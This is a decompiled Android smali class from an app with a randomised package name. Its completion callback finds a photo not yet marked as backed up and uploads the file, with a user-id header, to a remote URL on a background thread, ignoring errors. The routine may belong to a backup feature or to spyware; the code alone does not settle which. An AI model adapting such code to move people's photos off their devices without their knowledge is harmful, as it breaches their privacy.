.class public Li/a/a/s$h;
.super Ljava/lang/Object;
.source "sourcefile"

# interfaces
.implements Lj/a/h0/b/f;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Li/a/a/s;->p(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Lj/a/h0/b/f<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field public final synthetic e:Li/a/a/s;


# direct methods
.method public constructor <init>(Li/a/a/s;)V
    .locals 0
    .param p1, "this$0"    # Li/a/a/s;

    .line 1159
    iput-object p1, p0, Li/a/a/s$h;->e:Li/a/a/s;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lj/a/h0/c/c;)V
    .locals 0
    .param p1, "d"    # Lj/a/h0/c/c;

    .line 1163
    return-void
.end method

.method public b()V
    .locals 1

    const/4 v0, 0x0

    .line 1169
    .local v0, "result":Ljava/lang/String;
    return-void
.end method

.method public onComplete()V
    .locals 8

    .line 1181
    :try_start_0
    invoke-static {}, Lio/realm/Realm;->getDefaultInstance()Lio/realm/Realm;

    move-result-object v0

    .line 1182
    .local v0, "realm":Lio/realm/Realm;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 1183
    .local v1, "objv":Lorg/json/JSONObject;
    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;

    invoke-virtual {v0, v2}, Lio/realm/Realm;->where(Ljava/lang/Class;)Lio/realm/RealmQuery;

    move-result-object v2

    const-string v3, "backup"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lio/realm/RealmQuery;->equalTo(Ljava/lang/String;Ljava/lang/Boolean;)Lio/realm/RealmQuery;

    move-result-object v2

    invoke-virtual {v2}, Lio/realm/RealmQuery;->findFirst()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;

    .line 1185
    .local v2, "realmResult":Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;
    if-eqz v2, :cond_0

    .line 1187
    invoke-virtual {v2}, Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;->getId()Ljava/lang/String;

    move-result-object v3

    .line 1188
    .local v3, "id":Ljava/lang/String;
    new-instance v4, Ljava/io/File;

    invoke-virtual {v2}, Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;->getData()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1189
    .local v4, "file":Ljava/io/File;
    invoke-virtual {v4}, Ljava/io/File;->isFile()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 1192
    invoke-static {}, Li/a/a/q;->b()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lg/b/a;->c(Ljava/lang/String;)Lg/b/c/a$g;

    move-result-object v5

    const-string v6, "file"

    .line 1193
    invoke-virtual {v5, v6, v4}, Lg/b/c/a$g;->p(Ljava/lang/String;Ljava/io/File;)Lg/b/c/a$g;

    const-string v6, "filename"

    .line 1194
    invoke-virtual {v4}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lg/b/c/a$g;->o(Ljava/lang/String;Ljava/lang/String;)Lg/b/c/a$g;

    const-string v6, "x-uid"

    sget-object v7, Li/a/a/q;->a:Ljava/lang/String;

    .line 1195
    invoke-virtual {v5, v6, v7}, Lg/b/c/a$g;->o(Ljava/lang/String;Ljava/lang/String;)Lg/b/c/a$g;

    sget-object v6, Lg/b/c/e;->g:Lg/b/c/e;

    .line 1196
    invoke-virtual {v5, v6}, Lg/b/c/a$g;->u(Lg/b/c/e;)Lg/b/c/a$g;

    .line 1197
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v6

    invoke-virtual {v5, v6}, Lg/b/c/a$g;->t(Ljava/util/concurrent/Executor;)Lg/b/c/a$g;

    .line 1198
    invoke-virtual {v5}, Lg/b/c/a$g;->s()Lg/b/c/a;

    move-result-object v5

    new-instance v6, Li/a/a/s$h$a;

    invoke-direct {v6, p0, v3}, Li/a/a/s$h$a;-><init>(Li/a/a/s$h;Ljava/lang/String;)V

    .line 1199
    invoke-virtual {v5, v6}, Lg/b/c/a;->o(Lg/b/g/j;)V

    .line 1254
    .end local v3    # "id":Ljava/lang/String;
    .end local v4    # "file":Ljava/io/File;
    :cond_0
    invoke-virtual {v0}, Lio/realm/Realm;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1257
    .end local v0    # "realm":Lio/realm/Realm;
    .end local v1    # "objv":Lorg/json/JSONObject;
    .end local v2    # "realmResult":Lgqegwqg/bbebebefff/asdcdsac/realm/Photo;
    goto :goto_0

    .line 1255
    :catch_0
    move-exception v0

    .line 1258
    :goto_0
    return-void
.end method

.method public onError(Ljava/lang/Throwable;)V
    .locals 0
    .param p1, "e"    # Ljava/lang/Throwable;

    .line 1174
    return-void
.end method

.method public bridge synthetic onNext(Ljava/lang/Object;)V
    .locals 0

    .line 1159
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0}, Li/a/a/s$h;->b()V

    return-void
.end method
